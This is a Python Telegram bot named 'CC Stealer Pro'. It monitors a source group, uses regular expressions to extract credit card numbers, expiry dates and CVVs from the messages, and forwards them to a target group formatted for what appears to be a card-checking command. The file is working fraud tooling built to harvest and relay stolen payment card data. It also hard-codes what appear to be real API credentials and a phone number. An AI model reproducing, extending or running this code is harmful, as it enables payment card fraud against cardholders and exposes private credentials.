from telethon import TelegramClient, events
import re

# ================== CONFIG ==================
API_ID = 25777114
API_HASH = "83d41274e41d8330fc83876fb499432b"
PHONE_NUMBER = "+919908262004"

SOURCE_GROUP = -1002682944548    # Source group
TARGET_GROUP = -1002882603089    # Target group
OWNER_ID = 7835198116
# =============================================

seen = set()
running = False

client = TelegramClient("cc_stealer_pro", API_ID, API_HASH)

# --- Ultimate universal card extractor ---
def extract_combos(text):
    results = []

    # --- Pattern 1: single-line | separated (CVV optional) ---
    pattern1 = r'(\d{13,16})\|(\d{1,2})[ /]?(\d{2,4})(?:\|(\d{3,4}))?'
    matches1 = re.findall(pattern1, text)
    for ccnum, month, year, cvv in matches1:
        month = month.zfill(2)
        year = year[-2:]
        cvv = cvv if cvv else "000"
        combo = f"/ho {ccnum}|{month}|{year}|{cvv}"
        if combo not in seen:
            seen.add(combo)
            results.append(combo)

    # --- Pattern 2: multi-line labeled ---
    pattern2 = r'(\d{13,16}).*?(?:CVV:|CVC:|cvv\s*:\s*)(\d{3,4}).*?(?:EXP:|EXPIRE:|Exp\. month:|exp\s*:\s*)(\d{1,2})[ /](\d{2,4})'
    matches2 = re.findall(pattern2, text, re.DOTALL | re.IGNORECASE)
    for ccnum, cvv, month, year in matches2:
        month = month.zfill(2)
        year = year[-2:]
        combo = f"/ho {ccnum}|{month}|{year}|{cvv}"
        if combo not in seen:
            seen.add(combo)
            results.append(combo)

    # --- Pattern 3: multi-line simple (CC \n MM/YY \n CVV) ---
    pattern3 = r'(\d{13,16})\s*\n\s*(\d{1,2})/(\d{2,4})\s*\n\s*(\d{3,4})'
    matches3 = re.findall(pattern3, text, re.DOTALL)
    for ccnum, month, year, cvv in matches3:
        month = month.zfill(2)
        year = year[-2:]
        combo = f"/ho {ccnum}|{month}|{year}|{cvv}"
        if combo not in seen:
            seen.add(combo)
            results.append(combo)

    return results

# --- Commands ---
@client.on(events.NewMessage(pattern=r'/start stealer'))
async def start_stealer(event):
    global running
    if event.sender_id != OWNER_ID:
        await event.reply("❌ You are not authorized to run this command.")
        return
    running = True
    await event.reply("✅ Stealer started! Extracting all CC combos now.")

@client.on(events.NewMessage(pattern=r'/stop stealer'))
async def stop_stealer(event):
    global running
    if event.sender_id != OWNER_ID:
        await event.reply("❌ You are not authorized to run this command.")
        return
    running = False
    await event.reply("🛑 Stealer stopped!")

# --- Message handler ---
@client.on(events.NewMessage(chats=SOURCE_GROUP))
async def handler(event):
    global running
    if not running:
        return
    text = event.raw_text
    combos = extract_combos(text)
    for combo in combos:
        await client.send_message(TARGET_GROUP, combo)
        print("Forwarded:", combo)

# --- Main ---
async def main():
    print("Starting CC Stealer Pro Bot...")
    await client.start(PHONE_NUMBER)
    print("Bot ready. Waiting for /start stealer command...")

with client:
    client.loop.run_until_complete(main())
    client.run_until_disconnected()
